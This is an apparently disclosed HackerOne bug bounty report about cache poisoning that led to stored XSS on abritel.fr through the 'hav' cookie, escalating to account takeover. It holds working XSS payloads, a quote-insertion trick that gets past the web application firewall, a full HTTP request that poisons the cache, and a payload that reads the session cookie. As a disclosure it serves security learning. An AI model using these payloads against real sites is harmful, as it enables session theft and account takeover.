---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - vuln/xss-stored
  - vuln/xss
  - impact/account-takeover
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2023-04-01
submitted: 2022-11-02T19:18:44.156Z
bounty_usd: null
votes: 117
cve: []
program: "[[programs/expediagroup_bbp|Expedia Group Bug Bounty]]"
reporter: "bombon"
source: "https://hackerone.com/reports/1760213"
title: "Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)"
---
# Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 117 | **Program:** Expedia Group Bug Bounty | **Disclosed:** 2023-04-01

- Report: [https://hackerone.com/reports/1760213](https://hackerone.com/reports/1760213)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2022-11-02T19:18:44.156Z

## Report summary

I was able to Takeover Accounts Via Cache Poisoning (XSS)

This was possible due to:

1. `hav` cookie was reflected in the Response on https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js
```javascript
var hav="value from cookie"
```

2. The server had a protection where it was "Hiding" double quotes, however the server was not doing that with greater than and less than symbols (<>) which allowed me to closed the script tag and using that double quotes protection I was able to Bypass the WAF easily

WAF would trigger when:

```http
Cookie: hav=xss"</script><svg/onload=alert(document.domain)>
```
---

But using double quotes I was able to bypass the WAF:

```http
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
```

Which reflected in the response as:

```html
var hav="xss</script><svg/onload=alert(document.domain)>"
```


3. The Server sees https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js as a "cacheable" response, therefore the reflected value in the cookie was saved in that Page, any user who visited https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js would get XSSed

4. Session cookie was HTTPonly Flagged, however, In this same page where the XSS was, there was a JS Variable called `window.INITIAL_STATE.system.cookie`  where the session was located in clear text

With these four factors combined, I was able to Takeover Accounts

Team Fixed this by not reflecting ‘hav’ anymore.


[X](https://twitter.com/bxmbn)

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

Report #1698316 was closed as resolved 

You told me that the stored XSS was going to be resolved since "As this relies on the same root cause, we will be closing it as duplicate", but no 


abritel.fr has a strong WAF, however the server hides double quotes, allowing to bypass the WAF

e.g

The server blocks `</script`but if I send `</sc"ript>`

WAF is bypassed and the output is </script>


## Steps To Reproduce:


1-> Send this request 

```http
GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2
Host: www.abritel.fr
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp
Upgrade-Insecure-Requests: 1
Te: trailers
```

2-> Using another browser visit: 

https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.jpeg?xxxd

Exploit:

This is the payload to extract the HASESSIONV3 
xss"</sc"ript><sv"g/onloa"d=aler"t"(window.INITIAL_STATE.system.cookie)>


## Supporting Material/References:

{F2016192}

## Impact

Stored XSS to Account Takeover

## Timeline

- **Report Filed**
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
